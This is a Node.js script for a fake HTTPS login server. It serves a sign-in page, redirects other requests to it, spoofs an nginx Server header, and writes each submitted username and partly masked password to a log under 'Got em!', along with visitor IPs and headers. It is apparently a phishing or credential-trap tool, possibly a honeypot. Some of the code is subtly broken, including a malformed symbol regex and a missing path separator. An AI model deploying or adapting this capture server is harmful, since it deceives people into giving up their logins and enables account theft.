#!/usr/bin/env nodejs
/* Change these Variables */
const hostName = 'example.com';
const ipAddress = '0.0.0.0';

/* These variables stay the same*/
const https = require('https');
const http = require('http');
const url = require('url');
const fs = require('fs');
const logpath = __dirname + '/log';
const sslPath = '/etc/letsencrypt/live/' + hostName;

const options = {  
    key: fs.readFileSync(sslPath + 'privkey.pem'),
    cert: fs.readFileSync(sslPath + 'fullchain.pem')
};


function get_info(request, response)
{
	var getpath = url.parse(request.url).pathname;
	var datetime = new Date();
	var ip_srcdst = "\n\tNew Connection " + request.connection.remoteAddress + " -> " + request.headers['host'];
	var usr_agent = "\n\tUser Agent: " + request.headers['user-agent'];
	var uri = "\n\tRequested Resource: " + request.url;
	var method = "\n\tRequest Method: " + request.method;
	var accept = "\n\tAccept: " + request.headers['accept'];
	var type = "\n\tContent Type: " + request.headers['content-type'];
	var content_len = "\n\tContent Length: " + request.headers['content-length'];
	fs.appendFile(logpath, "\n---BEGIN---\n\t" + datetime + ip_srcdst + usr_agent + uri + method + accept + type + content_len, function(err) {console.log(err)});
}
function star_sensitive(list)
{
	stars = ""
	pwordlength = list[1].split("=")[1].length;
	if (pwordlength < 2)
	    return (list[1].split("=")[1]);
	numstars = pwordlength - 1;
	if (numstars > 0)
	    stars = Array(numstars).join("*")
	return("*" + stars + list[1].split("=")[1].slice(-1));
}
function pwd_strength(raw_pwd)
{
	var score = 0;
	var syms = new RegExp("~!@#$%^&*()_+`-=[]{}\|;:'\",<.>/?");
	if (/[a-z]/.test(raw_pwd))	
		score++;
	if (/[A-Z]/.test(raw_pwd))	
		score++;
	if (/[0-9]/.test(raw_pwd))	
		score++;
	if (raw_pwd.match(syms) > 0)
		score++;
	if (raw_pwd.match(syms) > 3)
		score++;
	if (raw_pwd.length > 6)
		score++;
	if (raw_pwd.length > 12)
		score++;
	if (raw_pwd.length > 35 && score > 3)
		return ("great")
	switch (score)
	{
	case 1: case 2: case 3:
		return ("horrible");	
	case 4: return ("bad");	
	case 5: return ("average");
	case 6: return ("good");
	case 7: return ("great");
	}
}
https.createServer(options, function (request, response) {
	var getpath = url.parse(request.url).pathname;
	var full_path = __dirname + getpath;
	var requestBody = '';
	response.setHeader('Host', hostName);
	response.setHeader('Server', "nginx/1.8.0");
	response.setHeader('Connection', "keep-alive");
	get_info(request, response);

	if (request.method === "POST")
	{
		response.writeHead(302, {'Location': ipAddress + "/auth/sign_in"});
		response.end();
		request.on('data', function(data){
			requestBody += data;
		});
		request.on('end', function(){
		        list = requestBody.split("&");
			stard_pwd = star_sensitive(list);
			fs.appendFile(logpath, "\tRequest Body:\n" + Array(10).join("#") + "\nGot em!\nUsername: " + list[0].split("=")[1], function(err){console.log(err)});
			fs.appendFile(logpath, "\nPassword: " + stard_pwd + "is " + pwd_strength(list[1].split("=")[1]) + '\n' + Array(10).join("#"), function(err){console.log(err)});
		});
	} 
	if (full_path === __dirname + "/auth/sign_in") {
		response.writeHead(200, {'Content-Type': 'text/html'});
		fs.readFile(__dirname + "/auth/sign_in", "binary", function(err, file){
			response.write(file, "binary");
			response.end();
		});
	} else if (full_path === __dirname + '/' || 
		full_path === __dirname + '/basic_server.js' || 
		full_path === __dirname + '/redirect.js' || 
		full_path === __dirname + '/flask.app') {
		response.writeHead(301, {'Location': ipAddress + "/auth/sign_in"});
		response.end();
	} else {
		fs.readFile(__dirname + "/public" + getpath, "binary", function(err, file){
			if(err){
				fs.readFile(__dirname + "/public/404", "binary", function(err, fourofour){
					response.writeHead(404, {'Content-Type': 'text/html'});
					response.write(fourofour, "binary");
					response.end();
				})
			} else {
				response.write(file, "binary");
				response.end();
			} 
		});
	}
}).listen(443, ipAddress);

/* Redirect */
http.createServer(function (request, response) {
    var getpath = url.parse(request.url).pathname;
    var full_path = __dirname + getpath;
    var requestBody = '';
	response.writeHead(301, {Location: "https://" + hostName});
	response.end();
}).listen(80, ipAddress);

fs.appendFile(logpath, "\nServer is now running\n", function(err){console.log(err)});
process.on('uncaughtException', function(err){ console.log(err);})
